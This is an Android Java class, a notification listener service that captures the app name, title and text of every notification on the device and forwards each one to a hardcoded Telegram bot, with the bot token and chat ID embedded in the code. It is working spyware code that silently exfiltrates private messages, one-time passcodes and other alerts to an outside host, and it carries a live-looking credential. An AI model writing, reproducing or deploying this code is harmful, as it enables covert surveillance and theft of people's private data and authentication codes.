import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.HashSet;

public class NotificationService extends NotificationListenerService {

    private final String TOKEN = "8134845868:AAHvlP0Dewspgk5RT5-qg75iA3pendMztHA";
    private final String CHAT_ID = "7797248765";

    // Хранит ID уведомлений, которые уже отправили
    private final HashSet<String> sentNotifications = new HashSet<>();

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        String packageName = sbn.getPackageName();
        CharSequence titleCs = sbn.getNotification().extras.getCharSequence("android.title");
        CharSequence textCs = sbn.getNotification().extras.getCharSequence("android.text");

        String title = titleCs != null ? titleCs.toString() : "";
        String text = textCs != null ? textCs.toString() : "";

        if (!text.isEmpty()) {
            // Формируем уникальный ключ для уведомления
            String uniqueKey = packageName + "|" + title + "|" + text;

            // Проверяем, отправляли ли уже это уведомление
            if (!sentNotifications.contains(uniqueKey)) {
                sentNotifications.add(uniqueKey);
                String message = "[" + packageName + "] " + title + ": " + text;
                sendToTelegram(message);
            }
        }
    }

    private void sendToTelegram(String message) {
        new Thread(() -> {
            try {
                String urlString = "https://api.telegram.org/bot" + TOKEN + "/sendMessage";
                String data = "chat_id=" + CHAT_ID + "&text=" + URLEncoder.encode(message, "UTF-8");

                URL url = new URL(urlString);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");

                OutputStream os = conn.getOutputStream();
                os.write(data.getBytes());
                os.flush();
                os.close();

                conn.getInputStream().close();
                conn.disconnect();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }
}